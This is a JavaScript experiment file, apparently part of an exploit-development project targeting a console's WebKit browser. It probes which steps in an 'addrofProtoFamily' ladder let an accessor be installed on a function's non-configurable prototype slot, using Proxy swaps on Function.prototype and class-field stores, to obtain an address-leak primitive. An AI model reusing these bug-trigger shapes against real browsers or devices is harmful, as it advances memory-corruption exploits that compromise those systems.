// protoattr-check: why did the console accept
// `target.__defineGetter__('prototype', getter)` when every host engine
// (webkitgtk 2.40.5 modelling build, system 2.54.2) throws
// "Attempting to change configurable attribute of unconfigurable property."?
//
// The ladder in src/exploit.ts (addrofProtoFamily) does three unusual things
// before the install: it parks a Proxy on Function.prototype and restores it,
// it stores `x` on the target, and it stores `this.prototype = {}` from a
// *class field initializer* inside `class A extends returnArgument`, where
// `super(value)` makes `this === target` (a plain function). One of those may
// take a define path that drops the DontDelete attribute from the lazy
// `prototype` slot, which would make the accessor install legal.
//
// Each case is reported as {desc, install, read, tag, ranGetter} so the host
// can see both whether the install was accepted and whether the later read
// invoked the accessor (normal) or returned the raw GetterSetter cell (the
// addrof primitive).
//
// Queue with:
//   sudo node tools/experiment.mjs enqueue protoattr-check --label protoattr-1
(function () {
  'use strict';
  if (typeof Ns2Webkit === 'undefined' || !Ns2Webkit.registerExperiment)
    throw new Error('protoattr-check: Ns2Webkit.registerExperiment is missing');

  var SENTINEL = 42;

  function errorText(error) {
    if (error === null || error === undefined) return 'none';
    try { return String((error.name || 'Error') + ': ' + (error.message || error)).slice(0, 140); }
    catch (ignored) { return 'unprintable'; }
  }

  function tag(value) {
    try { return Object.prototype.toString.call(value); }
    catch (error) { return 'tag-throw'; }
  }

  function describe(object) {
    var row = {};
    try {
      var descriptor = Object.getOwnPropertyDescriptor(object, 'prototype');
      if (!descriptor) return {missing: true};
      row.writable = !!descriptor.writable;
      row.enumerable = !!descriptor.enumerable;
      row.configurable = !!descriptor.configurable;
      row.getter = typeof descriptor.get;
      row.setter = typeof descriptor.set;
      row.hasValue = descriptor.value !== undefined;
    } catch (error) {
      return {error: errorText(error)};
    }
    return row;
  }

  function install(object) {
    var getter = function () { return SENTINEL; };
    try {
      object.__defineGetter__('prototype', getter);
      return {outcome: 'ok', getter: getter};
    } catch (error) {
      return {outcome: 'throw:' + errorText(error), getter: getter};
    }
  }

  function probe(name, build) {
    var row = {case: name};
    var getter = null;
    var target = null;
    try {
      target = build();
      row.built = true;
    } catch (error) {
      row.buildError = errorText(error);
      return row;
    }
    var attempted = install(target);
    getter = attempted.getter;
    row.install = attempted.outcome;
    row.descAfterInstall = describe(target);
    try {
      var value = target.prototype;
      row.readType = typeof value;
      row.readTag = tag(value);
      row.ranGetter = value === SENTINEL;
      if (row.readType === 'object' || row.readType === 'function')
        row.identityIsTarget = value === target;
    } catch (error) {
      row.readError = errorText(error);
    }
    row.descAfterRead = describe(target);
    return row;
  }

  function makeClass(store, useProxy) {
    var saved = Object.getPrototypeOf(Function.prototype);
    if (useProxy) Object.setPrototypeOf(Function.prototype, new Proxy({}, {}));
    try {
      function returnArgument(value) { return value; }
      var Base = returnArgument;
      class A extends Base {
        prototype = {};
        constructor(value) { super(value); if (store) store(value); }
      }
      return A;
    } finally {
      if (useProxy) Object.setPrototypeOf(Function.prototype, saved);
    }
  }

  function run() {
    var rows = [];
    var ua = '';
    try { ua = String(navigator.userAgent || '').slice(0, 160); } catch (ignored) { void ignored; }

    // 1. The exact exploit.ts shape: proxy dance on Function.prototype, `x` on
    //    the target, then a class-field `prototype = {}` landing on the target
    //    because `super(value)` returns it from the base constructor.
    rows.push(probe('ladder-exact', function () {
      var saved = Object.getPrototypeOf(Function.prototype);
      Object.setPrototypeOf(Function.prototype, new Proxy({}, {}));
      var object = {nonConstructor: function () {}};
      var target = function () {};
      Object.setPrototypeOf(Function.prototype, saved);
      object.nonConstructor.x = 1;
      target.x = 1;
      function returnArgument(value) { return value; }
      var Base = returnArgument;
      class A extends Base {
        prototype = {};
        constructor(value) { super(value); }
      }
      new A(object.nonConstructor);
      new A(target);
      return target;
    }));

    // 2. Same class-field shape, no proxy dance.
    rows.push(probe('ladder-no-proxy', function () {
      var target = function () {};
      function returnArgument(value) { return value; }
      var Base = returnArgument;
      class A extends Base {
        prototype = {};
        constructor(value) { super(value); }
      }
      new A({nonConstructor: function () {}});
      new A(target);
      return target;
    }));

    // 3. Field store only, single object.
    rows.push(probe('field-single', function () {
      var target = function () {};
      function returnArgument(value) { return value; }
      var Base = returnArgument;
      class A extends Base {
        prototype = {};
        constructor(value) { super(value); }
      }
      new A(target);
      return target;
    }));

    // 4. Plain assignment, no class involved.
    rows.push(probe('assign-plain', function () {
      var target = function () {};
      target.prototype = {};
      return target;
    }));

    // 5. Plain assignment after the proxy dance.
    rows.push(probe('assign-proxy', function () {
      var saved = Object.getPrototypeOf(Function.prototype);
      Object.setPrototypeOf(Function.prototype, new Proxy({}, {}));
      var target = function () {};
      Object.setPrototypeOf(Function.prototype, saved);
      target.prototype = {};
      return target;
    }));

    // 6. Object.defineProperty with an accessor, fresh function.
    rows.push(probe('defineproperty-fresh', function () {
      var target = function () {};
      var getter = function () { return SENTINEL; };
      try { Object.defineProperty(target, 'prototype', {get: getter, configurable: true}); }
      catch (ignored) { void ignored; }
      return target;
    }));

    // 7. Control: read the descriptor first (this reifies with DontDelete),
    //    then install. Host engines reject here.
    rows.push(probe('read-then-install', function () {
      var target = function () {};
      void target.prototype;
      return target;
    }));

    // 8. Arrow function: no own `prototype`, so the install must create a new
    //    configurable accessor. Control for "the install works at all".
    rows.push(probe('arrow-plain', function () {
      var target = () => 0;
      return target;
    }));

    // 9. Class constructor target (isClassConstructorFunction fast path).
    rows.push(probe('class-ctor', function () {
      class C {}
      var getter = function () { return SENTINEL; };
      try { Object.defineProperty(C, 'prototype', {get: getter, configurable: true}); }
      catch (ignored) { void ignored; }
      return C;
    }));

    var accepted = 0, bypass = 0;
    for (var i = 0; i < rows.length; i++) {
      if (rows[i].install === 'ok') accepted++;
      if (rows[i].install === 'ok' && rows[i].ranGetter === false && rows[i].readType !== 'undefined') bypass++;
    }
    return {ua: ua, rows: rows, accepted: accepted, bypass: bypass,
      note: 'bypass means the accessor was installed but the read returned the raw cell'};
  }

  Ns2Webkit.registerExperiment({
    name: 'protoattr-check',
    description: 'does the console accept an accessor on function.prototype, and which ladder step permits it',
    run: run
  });
})();
